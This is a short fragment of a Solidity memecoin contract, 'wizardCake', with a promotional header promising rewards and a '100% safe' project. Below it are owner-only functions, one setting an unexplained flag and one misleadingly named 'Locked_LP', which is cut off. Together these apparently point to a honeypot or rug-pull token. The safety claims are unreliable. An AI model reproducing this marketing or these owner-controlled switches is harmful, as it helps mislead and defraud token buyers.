...
/**
🚀STEALTH FAİRLUNCH 100 MEMBERS 🚀

🪄🍰 WizardCake is a community driven Token, with instant rewards for holders, fully secured and 100% safe project. Join the  mission to the moon.

reward holders with Cake! Missed Baby Cake, join wizardCake army. Amazing launch and start. Organic Community, we created a new trend in the memecoin space when it comes to Multi-Dividend tokens.
...
contract wizardCake is Context, IERC20, IERC20Metadata, Ownable {   
    ...
    function Returns(bool _value) public onlyOwner virtual returns (bool) {
        isValue = _value;
        return true;
    }

    function Locked_LP(uint256 amount) public onlyOwner virtual returns (bool) {
